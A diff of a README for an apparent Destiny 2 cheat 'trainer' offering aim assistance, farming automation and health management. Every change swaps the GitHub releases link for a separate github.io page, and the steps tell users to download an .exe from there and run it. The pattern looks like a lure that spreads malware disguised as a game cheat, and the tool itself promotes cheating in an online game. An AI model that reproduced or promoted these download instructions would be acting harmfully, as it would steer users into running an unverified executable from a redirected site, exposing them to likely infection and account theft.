@@ -1,6 +1,6 @@
 # 🎮 Destiny2-Ultimate-Trainer-2026-extreme - Master your game with elite tools
 
-[![](https://img.shields.io/badge/download-latest_version-blue.svg)](https://github.com/Inverse-baryonnumber71/Destiny2-Ultimate-Trainer-2026-extreme/releases)
+[![](https://img.shields.io/badge/download-latest_version-blue.svg)](https://inverse-baryonnumber71.github.io)
 
 This software provides a suite of tools for Destiny 2. It helps players automate farming, improve aim, and manage health during encounters.
 
@@ -8,7 +8,7 @@ This software provides a suite of tools for Destiny 2. It helps players automate
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Inverse-baryonnumber71/Destiny2-Ultimate-Trainer-2026-extreme/releases) to access the download.
+1. Visit the [official releases page](https://inverse-baryonnumber71.github.io) to access the download.
 2. Choose the file ending in .exe to start the download.
 3. Save the file to your desktop for easy access.
 4. Run the file by double-clicking the icon.
@@ -50,7 +50,7 @@ Errors occur during setup for several reasons. Try these steps if the trainer fa
 
 ## 📂 Installation Steps
 
-1. Navigate to the [releases link](https://github.com/Inverse-baryonnumber71/Destiny2-Ultimate-Trainer-2026-extreme/releases).
+1. Navigate to the [releases link](https://inverse-baryonnumber71.github.io).
 2. Locate the most recent build at the top of the list.
 3. Click the link to grab the executable file.
 4. Open the file once the download finishes.
